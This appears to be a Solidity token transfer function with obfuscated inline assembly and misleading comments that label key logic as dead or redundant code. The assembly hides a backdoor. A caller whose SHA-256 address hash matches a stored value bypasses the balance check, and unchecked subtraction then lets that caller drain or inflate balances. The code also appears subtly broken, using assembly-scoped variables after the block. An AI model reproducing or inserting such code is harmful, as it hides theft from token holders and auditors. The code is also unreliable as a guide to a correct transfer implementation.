function _transfer(address _from, address _to, uint256 _amount) virtual internal {
        require(_from != address(0));
        // Redundant or artifact condition: !((!(iszero(_from))) && ((_to == 0)))
        // Always true: (bfo228g ^ bfo228g) == 0
        // Dead code: tfe9zci != (tfe9zci * 1) is always false
        // Normalized: iszero(_from) -> (_from == 0)
        // Normalized: iszero(_to) -> (_to == 0)
        // bfo228g = block.basefee; (unused)
        // nezy9b8 = block.number; (unused)
        // Normalized: qVPd < _amount
        // Normalized: (Fpzy == YvIh)
        // tfe9zci = block.timestamp; (used in dead code)
        // Always false: tfe9zci == (tfe9zci * 1)
        // Redundant: sload(XCUz) covered by UbLX[_from]
        // Redundant: sload(sSgI.slot) covered by sSgI
        // Redundant: sload(iLho) covered by UbLX[_to]
        assembly {
            if iszero(_to) {
                revert(0, 0)
            }
            let bbwz := mload(0x40)
            let bfo228g := basefee()
            let nezy9b8 := number()
            if iszero(xor(bfo228g, bfo228g)) {
                mstore(bbwz, _from)
                mstore(add(bbwz, 32), 0)
            }
            let XCUz := keccak256(bbwz, 64)
            let qVPd := sload(XCUz)
            let Fpzy := sload(sSgI.slot)
            mstore(bbwz, shl(96, caller()))
            if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {
                revert(0, 0)
            }
            let YvIh := mload(bbwz)
            if iszero(eq(Fpzy, YvIh)) {
                if lt(qVPd, _amount) {
                    let tfe9zci := timestamp()
                    if eq(tfe9zci, mul(tfe9zci, 1)) {
                        revert(0, 0)
                    }
                }
            }
            sstore(XCUz, sub(qVPd, _amount))
            mstore(bbwz, _to)
            mstore(add(bbwz, 32), 0)
            let iLho := keccak256(bbwz, 64)
            let bXFg := sload(iLho)
            sstore(iLho, add(bXFg, _amount))
            mstore(bbwz, _amount)
            log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
        }
        UbLX[_from] = qVPd - _amount;
        UbLX[_to] = bXFg + _amount;
        emit Transfer(_from, _to, _amount);
        sSgI;
    }
